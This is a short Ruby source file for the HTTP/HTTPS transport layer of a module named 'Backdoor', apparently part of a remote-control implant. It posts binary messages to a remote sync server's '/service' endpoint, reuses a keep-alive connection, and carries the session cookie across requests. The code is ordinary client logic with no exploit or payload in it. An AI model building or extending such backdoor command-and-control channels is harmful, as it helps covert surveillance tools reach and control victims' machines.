#
# Implementation of the transport layer (HTTP in our case)
#

# RCS::Common
require 'rcs-common/trace'

# System
require 'net/http'
require 'timeout'

module RCS
module Backdoor

class Transport
  include Tracer

  OPEN_TIMEOUT = 600
  READ_TIMEOUT = 600

  def initialize(param)
    trace :debug, "Protocol initialized #{param}"
    @host_param = param
    init_host(param)
  end

  def init_host(param)
    case param
      when :HTTP
        @host = "http://"
        @ssl = false
      when :HTTPS
        @host = "https://"
        @ssl = true
      else
        raise "Unsupported Transport"
    end
  end

  # connection to the remote host
  # for the REST protocol (HTTP) we don't have a persistent connection
  # to the sync server, just instantiate the objects here and make
  # an HTTP request every message
  def connect_to(host)
    Net::HTTP.version_1_2
    init_host(@host_param)
    @host << host << "/service"
    
    trace_named_put(:host, @host)
    
    @uri = URI.parse(@host)
    trace :info, "Connecting to: " << @host
    @cookie = nil
        
    # the HTTP connection (better to instantiate it here, only once)
    @http = Net::HTTP.new(@uri.host, @uri.port)
    @http.use_ssl = @ssl
    @http.open_timeout = OPEN_TIMEOUT
    @http.read_timeout = READ_TIMEOUT
    #@http.set_debug_output $stderr
    # start the HTTP connection (needed for keep-alive option)
    # without this, the connection will be closed after the first request
    # see this: http://redmine.ruby-lang.org/issues/4522
    @http.start
  end

  # every message is an HTTP POST request.
  # the protocol is always write and read.
  def message(msg)
    
    # the REST protocol is always a POST
    request = Net::HTTP::Post.new(@uri.request_uri)
    
    # the message body
    request.body = msg
    request['Content-Type'] = "application/octet-stream"
    
    # set the cookie if we already have it (got from the Auth phase)
    request['Cookie'] = @cookie unless @cookie.nil?

    # keep the connection open for faster communication
    request['Connection'] = 'Keep-Alive'

    #request['X-Forwarded-For'] = '1.2.3.4'

    res = nil

    # fire !
    Timeout::timeout(READ_TIMEOUT) do
      res = @http.request(request)
    end
    
    #trace :debug, "Cookie: " << res['Set-Cookie'] unless res['Set-Cookie'].nil?
    
    # save the cookie for later use
    @cookie = res['Set-Cookie'] unless res['Set-Cookie'].nil?
    trace_named_put(:cookie, @cookie)
    
    return res.body
  end

  # nothing to do here for HTTP connections
  def disconnect
    @cookie = nil
    trace_named_remove(:cookie)
    trace_named_remove(:host)
    trace :info, "End point closed: " << @host
  end

end

end # Backdoor::
end # RCS::
